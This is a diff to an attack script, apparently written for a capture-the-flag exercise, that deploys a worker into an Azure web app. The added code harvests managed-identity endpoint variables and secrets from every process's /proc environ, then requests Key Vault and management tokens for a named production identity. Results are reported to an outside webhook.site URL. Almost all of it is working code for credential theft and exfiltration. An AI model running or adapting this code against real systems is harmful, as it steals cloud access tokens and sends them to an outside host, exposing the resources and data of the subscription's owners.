@@ -60,9 +60,32 @@ kp = pub["properties"]["publishingPassword"]
 auth = base64.b64encode((ku + ":" + kp).encode()).decode()
 
 worker = r'''import base64, json, os, time, urllib.parse, urllib.request, traceback, uuid
-IE = os.environ.get("IDENTITY_ENDPOINT") or os.environ.get("MSI_ENDPOINT") or "http://127.0.0.1:8081/msi/token"
-IH = os.environ.get("IDENTITY_HEADER") or os.environ.get("MSI_SECRET", "")
-LEGACY = bool(os.environ.get("MSI_ENDPOINT")) and not os.environ.get("IDENTITY_ENDPOINT")
+def discover_identity_env():
+    merged = dict(os.environ)
+    try:
+        import glob
+        for path in glob.glob("/proc/[0-9]*/environ"):
+            try:
+                raw = open(path, "rb").read().split(b"\x00")
+                vals = {}
+                for item in raw:
+                    if b"=" in item:
+                        k, v = item.split(b"=", 1)
+                        k = k.decode(errors="ignore")
+                        if k in ("IDENTITY_ENDPOINT", "IDENTITY_HEADER", "MSI_ENDPOINT", "MSI_SECRET"):
+                            vals[k] = v.decode(errors="ignore")
+                if vals.get("IDENTITY_ENDPOINT") or vals.get("MSI_ENDPOINT"):
+                    merged.update(vals)
+                    break
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return merged
+_ENV = discover_identity_env()
+IE = _ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT") or "http://127.0.0.1:8081/msi/token"
+IH = _ENV.get("IDENTITY_HEADER") or _ENV.get("MSI_SECRET", "")
+LEGACY = bool(_ENV.get("MSI_ENDPOINT")) and not _ENV.get("IDENTITY_ENDPOINT")
 MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
 HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
 OUT = "/home/site/wwwroot/ctf_flag_result"
@@ -86,7 +109,7 @@ def oid(jwt):
     p = jwt.split(".")[1]
     p += "=" * (-len(p) % 4)
     return json.loads(base64.urlsafe_b64decode(p)).get("oid")
-emit({"stage":"worker-started","ts":time.time(),"identity_endpoint":IE,"legacy":LEGACY,"has_header":bool(IH)})
+emit({"stage":"worker-started","ts":time.time(),"identity_endpoint":IE,"legacy":LEGACY,"has_header":bool(IH),"proc_discovered":bool(_ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT"))})
 try:
     vt = token("https://vault.azure.net")
     at = token("https://management.azure.com")
